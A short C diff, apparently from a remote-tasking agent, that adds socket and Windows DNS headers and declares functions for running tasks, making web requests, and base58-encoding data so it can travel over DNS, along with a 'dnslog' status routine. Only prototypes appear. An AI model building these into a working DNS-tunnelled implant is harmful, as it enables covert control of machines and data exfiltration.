@@ -6,18 +6,22 @@
 #include <stdlib.h>
 
 #ifdef LINUX_VERSION
-#include <unistd.h>
+#include <sys/socket.h> // socket stuff
+#include <arpa/inet.h>  // inet_addr
+#include <netdb.h>
+#include <unistd.h>     // for sleep
+
+#define _snprintf snprintf
+
 #endif
+
 
 #ifdef WINDOWS_VERSION
 
 #include <windows.h>
 #include <winsock2.h>
 #include <ws2tcpip.h>
-
-#pragma comment (lib, "Ws2_32.lib")
-#pragma comment (lib, "Mswsock.lib")
-#pragma comment (lib, "AdvApi32.lib")
+#include <windns.h>
 
 extern int WSAAPI getaddrinfo (const char*,const char*,const struct addrinfo*,
 		        struct addrinfo**);
@@ -29,10 +33,16 @@ bool file_exists(char *filename);
 char* getmyhostname();
 void setmyhostname();
 void runtask(char *task);
-void makepath(char* dest, int destlen, char* front, char* back);
+void makepath(char* dest, int destlen, char* back);
 int get_content_length(char *response);
 void webrequest(char* ip, int port, char* torequest, char* outpath);
 
-void base64encode(char** in, char** out);
+void base64encode(char* in, char* out);
+void base64decode(char* in, char* out);
 
-void base64decode(char** in, char** out);
+//base64 not compatible with dns :(
+void base58encode(const char* in, const int in_len, char* out, int* out_len);
+void base58decode(const char *encoded_value, char *out, int out_size);
+void originalb58encode (const char* in, const unsigned int in_len, char* out, unsigned int* out_len);
+
+void dnslog(char* status);
